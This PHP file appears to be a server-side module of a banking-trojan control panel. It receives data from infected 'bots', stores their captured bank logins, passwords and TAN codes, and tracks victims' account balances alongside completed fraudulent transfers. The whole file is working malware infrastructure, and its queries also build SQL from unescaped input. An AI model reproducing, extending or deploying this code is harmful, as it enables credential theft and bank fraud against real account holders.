<?php

class ServiceAccounts {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
	
	if(!empty($this->bot->info)){
	    $this->bot->info = json_decode(base64_decode($this->bot->info), 1);
	    if(!is_array($this->bot->info)) $this->bot->info = array();
	}else{
	    $this->bot->info = array();
	}
    }
    
    function SetVersion($ver = ''){
	if(empty($ver)){
	    return false;
	}else{
	    $this->db->query('update bf_bots set version = \''.$ver.'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
	}
        return $ver;
    }
   
    // сохраняет логин и пароль при повторном вызове перезаписывает
    function Auth($login = '', $password = ''){	
	if(!isset($this->bot->info['logs'])) $this->bot->info['logs'] = array();
	
	$this->bot->info['logs']['login'] = $login;
        $this->bot->info['logs']['password'] = $password;
	
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return array($login , $password);
    }
    
    function SaveTan($tannum = ''){	
	if(!isset($this->bot->info['logs'])) $this->bot->info['logs'] = array();
	
	if(!isset($this->bot->info['logs']['tan'][0])){
	    $this->bot->info['logs']['tan'][] = array($tannum, '', time());
	}else{
	    array_unshift($this->bot->info['logs']['tan'], array($tannum, '', time()));
	}
	
	if(count($this->bot->info['logs']['tan']) >= 20){
	    $this->bot->info['logs']['tan'] = array_slice($this->bot->info['logs']['tan'], 0, 20);
	}
	
        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
        
        return array($tannum, '', time());
    }
    
    function SetAccountsList($accounts){
	if(empty($accounts)) return false;
	
	$return = array();
	
	foreach($accounts as $acc){	    
	    $cn = count($return);
	    
	    $balance = $this->db->query('SELECT id, prefix, uid, acc, balance, system FROM bf_balance WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid .'\') AND (acc = \''.$acc['account'].'\') AND (system = \''.$this->system->nid.'\') LIMIT 1');
	    
	    if(is_object($balance) && $balance->prefix == $this->bot->prefix && $balance->uid == $this->bot->uid && $balance->acc == $acc['account'] && $balance->system == $this->system->nid){
		$return[$cn] = array();
		$return[$cn]['acc'] = $acc['account'];
		$return[$cn]['id'] = $balance->id;
		$return[$cn]['amount'] = $this->db->query_name('SELECT SUM(num) count FROM bf_transfers WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (acc = \''.$acc['account'].'\') AND (system = \''.$this->system->nid.'\') AND (status = \'2\')');;
		$return[$cn]['real'] = $balance->balance;
		
		$this->db->query('update bf_balance set post_date = CURRENT_TIMESTAMP(), balance = \''.$acc['amount'].'\' WHERE (id = \''.$balance->id.'\') LIMIT 1');
	    }else{
		$id = $this->db->query("INSERT INTO bf_balance set userid = '".$this->bot->userid."', prefix = '".$this->bot->prefix."', uid = '".$this->bot->uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc['account']."', system='".$this->system->nid."', balance='".$acc['amount']."'");
		
		if(empty($id)){
		    $balance = $this->db->query('SELECT id FROM bf_balance WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (acc = \''.$acc['account'].'\') AND (system = \''.$this->system->nid.'\') AND (balance = \''.$acc['amount'].'\') LIMIT 1');
		    $id = $balance->id;
		}
		
		$return[$cn] = array();
		$return[$cn]['acc'] = $acc['account'];
		$return[$cn]['id'] = $id;
		$return[$cn]['amount'] = '0';
		$return[$cn]['real'] = $acc['amount'];
	    }
	}
	
	$this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
	
	return $return;
    }

}

RegisterService("ServiceAccounts");